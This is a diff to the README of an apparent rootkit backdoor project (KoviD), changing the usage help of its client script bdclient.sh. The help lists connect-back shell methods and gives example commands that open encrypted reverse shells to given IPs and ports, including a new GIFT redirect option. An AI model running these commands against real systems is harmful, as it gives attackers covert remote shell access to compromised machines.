@@ -196,9 +196,9 @@
     There is a simple script to facilitate: client/bdclient.sh
 
 ```bash
-     $ ./bdclient.sh
+ $ ./bdclient.sh
     Error: Missing parameter
-    Use: [V=1] bdclient.sh <method> <IP> <PORT>
+    Use: [V=1] ./bdclient.sh <method> <IP> <PORT>
 
         Methods:
             openssl:    OpenSSL encrypted connect-back shell
@@ -214,10 +214,17 @@
             Local port for connect-back session - must be unfiltered
 
         Example:
-            bdclient.sh openssl 192.168.1.10 9999
+            ./bdclient.sh openssl 192.168.1.10 9999
 
         Verbose, example:
-            V=1 bdclient.sh openssl 192.168.1.10 9999
+            V=1 ./bdclient.sh openssl 192.168.1.10 9999
+
+        Connect to GIFT address instead of this machine:
+            GIFT=192.168.0.30 ./bdclient.sh openssl 192.168.1.10 443
+
+        If used alongside with GIFT, DRY(run) will NOT send KoviD instruction and will show client's command:
+            DRY=true GIFT=192.168.0.30 ./bdclient.sh openssl 192.168.1.44 444
+
 ```
 
     Example:
